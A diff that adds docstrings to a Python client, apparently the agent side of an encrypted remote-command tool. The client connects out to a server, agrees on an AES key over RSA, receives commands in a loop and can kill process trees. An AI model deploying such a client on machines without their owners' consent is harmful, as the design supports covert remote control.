@@ -16,12 +16,13 @@ from cryptography.hazmat.primitives.asymmetric import padding, rsa
 logging.basicConfig(level=logging.CRITICAL)
 
 def Hasher(MESSAGE : bytes):
-
+    """ Hashes data """
     digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
     digest.update(MESSAGE)
     return digest.finalize()
 
 def verifySignature(publicKey, signature, message):
+    """ Verify signature with public key """
     try:
         publicKey.verify(
             signature,
@@ -37,6 +38,7 @@ def verifySignature(publicKey, signature, message):
         return False
 
 def sign(privateKey, data):
+    """ Sign data with private key """
     signature = privateKey.sign(
         data,
         padding.PSS(
@@ -48,6 +50,7 @@ def sign(privateKey, data):
     return signature
 
 def encrypt(publicKey, plaintext):
+    """ Encrypt using public key """
     ciphertext = publicKey.encrypt(
         plaintext,
         padding.OAEP(
@@ -58,6 +61,7 @@ def encrypt(publicKey, plaintext):
     return ciphertext
 
 def decrypt(privateKey, ciphertext):
+    """ Decrypt using private key """
     plaintext = privateKey.decrypt(
         ciphertext,
         padding.OAEP(
@@ -69,6 +73,7 @@ def decrypt(privateKey, ciphertext):
     return plaintext
 
 def public_bytes(publicKey):
+    """ Get Public Key in Bytes """
     serializedPublic = publicKey.public_bytes(
         encoding=serialization.Encoding.PEM,
         format=serialization.PublicFormat.SubjectPublicKeyInfo
@@ -76,6 +81,7 @@ def public_bytes(publicKey):
     return serializedPublic
 
 def kill(proc_pid):
+    """ Kill Process by ID """
     process = psutil.Process(proc_pid)
     for proc in process.children(recursive=True):
         proc.kill()
@@ -106,7 +112,7 @@ class Client(object):
         return
 
     def socket_connect(self):
-        """ Connect to a remote socket """
+        """ Connect to a remote socket using RSA and agreeing on a AES key"""
         try:
             self.socket.connect((self.serverHost, self.serverPort))
         except socket.error as e:
@@ -148,17 +154,20 @@ class Client(object):
         return data
 
     def receive(self):
+        """ Receives Buffer Size and Data from Server Encrypted with AES """
         length = int(self.Fer.decrypt(self.socket.recv(2048)).decode())
         self.socket.send(b'<RECEIVED>')
         return self.Fer.decrypt(self.recvall(length))
 
     def send(self, data):
+        """ Sends Buffer Size and Data to Server Encrypted with AES """
         encrypted = self.Fer.encrypt(data)
         self.socket.send(self.Fer.encrypt(str(len(encrypted)).encode()))
         self.socket.recv(1024)
         self.socket.send(encrypted)
 
     def receive_commands(self):
+        """ Receives Commands from Server """
         while True:
             data = self.receive()
             if data == b'<LIST>':
@@ -225,6 +234,7 @@ class Client(object):
                 continue
 
 def main():
+    """ Run Client """
     client = Client()
     client.socket_create()
     while True:
